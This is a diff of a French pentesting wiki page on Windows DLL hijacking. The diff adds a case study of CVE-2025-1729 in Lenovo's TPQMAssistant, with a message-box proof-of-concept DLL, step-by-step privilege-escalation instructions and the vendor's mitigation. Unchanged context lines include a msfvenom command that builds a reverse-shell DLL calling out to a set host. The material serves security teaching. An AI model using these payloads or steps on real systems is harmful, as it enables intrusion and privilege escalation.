@@ -41,7 +41,7 @@ Pour escalader les privilèges, la meilleure chance que nous avons est de pouvoi
 
 **Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les DLL sont chargées spécifiquement.**
 
-**Les applications Windows** recherchent des DLL en suivant un ensemble de **chemins de recherche prédéfinis**, respectant une séquence particulière. Le problème du DLL hijacking se pose lorsqu'un DLL nuisible est stratégiquement placé dans l'un de ces répertoires, garantissant qu'il soit chargé avant le DLL authentique. Une solution pour prévenir cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle fait référence aux DLL dont elle a besoin.
+Les **applications Windows** recherchent des DLL en suivant un ensemble de **chemins de recherche prédéfinis**, respectant une séquence particulière. Le problème du DLL hijacking survient lorsqu'un DLL nuisible est stratégiquement placé dans l'un de ces répertoires, garantissant qu'il soit chargé avant le DLL authentique. Une solution pour prévenir cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle fait référence aux DLL dont elle a besoin.
 
 Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32 bits** ci-dessous :
 
@@ -105,20 +105,20 @@ D'autres outils automatisés intéressants pour découvrir cette vulnérabilité
 
 ### Exemple
 
-Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour réussir à l'exploiter serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera de celui-ci**. Quoi qu'il en soit, notez que le Dll Hijacking est utile pour [escalader du niveau d'intégrité moyen au niveau élevé **(en contournant UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**l'intégrité élevée au SYSTÈME**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer un dll valide** dans cette étude sur le dll hijacking axée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera de celui-ci**. Quoi qu'il en soit, notez que le Dll Hijacking est utile pour [escalader du niveau d'intégrité moyen au niveau élevé **(en contournant UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**l'intégrité élevée au SYSTÈME**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer un dll valide** dans cette étude de dll hijacking axée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
 De plus, dans la **section suivante**, vous pouvez trouver quelques **codes dll de base** qui pourraient être utiles comme **modèles** ou pour créer un **dll avec des fonctions non requises exportées**.
 
 ## **Création et compilation de Dlls**
 
 ### **Proxy Dll**
 
-Fondamentalement, un **proxy Dll** est un Dll capable d'**exécuter votre code malveillant lorsqu'il est chargé** mais aussi d'**exposer** et de **fonctionner** comme **prévu** en **relayant tous les appels à la véritable bibliothèque**.
+Fondamentalement, un **proxy Dll** est un Dll capable d'**exécuter votre code malveillant lorsqu'il est chargé**, mais aussi d'**exposer** et de **fonctionner** comme **prévu** en **relayant tous les appels à la véritable bibliothèque**.
 
 Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer un dll proxifié** ou **indiquer le Dll** et **générer un dll proxifié**.
 
 ### **Meterpreter**
 
-**Obtenir un shell inversé (x64) :**
+**Obtenir un shell rev (x64) :**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -213,10 +213,48 @@ break;
 return TRUE;
 }
 ```
+## Étude de cas : CVE-2025-1729 - Escalade de privilèges utilisant TPQMAssistant.exe
+
+Cette étude démontre **Phantom DLL Hijacking** dans le Menu Rapide TrackPoint de Lenovo (`TPQMAssistant.exe`), suivi comme **CVE-2025-1729**.
+
+### Détails de la vulnérabilité
+
+- **Composant** : `TPQMAssistant.exe` situé à `C:\ProgramData\Lenovo\TPQM\Assistant\`.
+- **Tâche planifiée** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s'exécute quotidiennement à 9h30 sous le contexte de l'utilisateur connecté.
+- **Permissions de répertoire** : Écrivable par `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
+- **Comportement de recherche de DLL** : Tente de charger `hostfxr.dll` depuis son répertoire de travail en premier et enregistre "NAME NOT FOUND" si manquant, indiquant une priorité de recherche dans le répertoire local.
+
+### Mise en œuvre de l'exploit
+
+Un attaquant peut placer un stub `hostfxr.dll` malveillant dans le même répertoire, exploitant la DLL manquante pour obtenir une exécution de code sous le contexte de l'utilisateur :
+```c
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
+if (fdwReason == DLL_PROCESS_ATTACH) {
+// Payload: display a message box (proof-of-concept)
+MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
+}
+return TRUE;
+}
+```
+### Flux d'attaque
+
+1. En tant qu'utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
+2. Attendez que la tâche planifiée s'exécute à 9h30 sous le contexte de l'utilisateur actuel.
+3. Si un administrateur est connecté lorsque la tâche s'exécute, le DLL malveillant s'exécute dans la session de l'administrateur avec une intégrité moyenne.
+4. Enchaînez les techniques de contournement UAC standard pour élever les privilèges de l'intégrité moyenne à SYSTEM.
+
+### Atténuation
+
+Lenovo a publié la version UWP **1.12.54.0** via le Microsoft Store, qui installe TPQMAssistant sous `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, supprime la tâche planifiée vulnérable et désinstalle les composants Win32 hérités.
+
 ## Références
+
+- [CVE-2025-1729 - Élévation de privilèges utilisant TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
+- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
 
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
